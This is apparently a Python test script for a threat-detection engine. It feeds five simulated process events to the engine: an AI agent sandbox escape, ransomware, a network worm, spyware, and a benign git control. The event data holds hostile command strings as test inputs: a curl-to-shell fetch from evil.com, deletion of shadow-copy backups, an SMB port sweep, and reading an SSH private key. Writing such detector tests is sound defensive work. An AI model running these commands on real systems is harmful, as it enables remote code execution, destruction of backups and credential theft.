"""
Antigravity/test_universal_threats.py - Universal Threat Simulation & Verification Tool.
Simulates:
  1. AI Sandbox / Runtime Escape
  2. Mutated Ransomware (WannaCry variant)
  3. Network Worm (SMB/SSH Lateral Movement)
  4. 'CTRL' Movie-Style Spyware & Surveillance
  5. Benign Developer Activity (Safe Control)
"""
import sys
import os

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from src.main import SentinelEngine

def run_simulation():
    engine = SentinelEngine()

    test_scenarios = [
        {
            "name": "Scenario 1: AI Sandbox & Runtime Escape",
            "event": {
                "pid": 89124,
                "cmd": "bash -i -c 'curl evil.com/payload | sh'",
                "parent": "ollama-agent-runtime",
                "path": "/var/run/docker.sock",
                "is_interactive": False,
                "user": "sandbox_user"
            }
        },
        {
            "name": "Scenario 2: Mutated Ransomware (WannaCry-like Cryptor)",
            "event": {
                "pid": 65219,
                "cmd": "vssadmin delete shadows /all /quiet && update_tool.exe",
                "parent": "svchost_fake.exe",
                "path": "/Users/dev/Documents/project_backup.locked",
                "file_write_rate": 42,
                "canary_tampered": True,
                "is_interactive": False,
                "user": "vatsalagarwal"
            }
        },
        {
            "name": "Scenario 3: Network Worm (Lateral Propagation)",
            "event": {
                "pid": 41203,
                "cmd": "masscan -p 445,139 192.168.1.0/24 --rate 1000",
                "parent": "explorer_fake",
                "path": "/Volumes/SharedNetworkDrive",
                "connections_per_sec": 18,
                "is_interactive": False,
                "user": "vatsalagarwal"
            }
        },
        {
            "name": "Scenario 4: 'CTRL' Movie-Style Covert Spyware & Surveillance",
            "event": {
                "pid": 33104,
                "cmd": "screencapture -x -C /tmp/.hidden_stream.png && sqlite3 ~/.ssh/id_rsa",
                "parent": "background_sync_service",
                "path": "~/.ssh/id_rsa",
                "is_interactive": False,
                "user": "vatsalagarwal"
            }
        },
        {
            "name": "Scenario 5: Benign Developer Control (Normal Workflow)",
            "event": {
                "pid": 12004,
                "cmd": "git status && git log -n 5",
                "parent": "VS Code",
                "path": "/Users/vatsalagarwal/Documents/IT & CS/Project",
                "is_interactive": True,
                "user": "vatsalagarwal"
            }
        }
    ]

    print("\n" + "="*70)
    print("🔬 UNIVERSAL THREAT ENGINE BENCHMARK & SIMULATION SUITE")
    print("="*70)

    for sc in test_scenarios:
        print(f"\n▶ TESTING {sc['name']}...")
        result = engine.inspect_event(sc["event"])

        cl = result["threat_classification"]
        if cl["identified"]:
            print(f"   [RESULT] Identified as: {cl['candidate_family']}")
            print(f"   [MODE]   Operational Mode: {cl['operational_mode']}")
            print(f"   [SCORE]  Confidence: {cl['confidence_percent']}% | Mutated Variant: {cl['is_mutated']}")
            print("\n" + result["advisory_text"])
        else:
            print("   [RESULT] Verdict: ✅ BENIGN / SAFE ACTIVITY (No threat detected)")
        print("-" * 70)

if __name__ == "__main__":
    run_simulation()
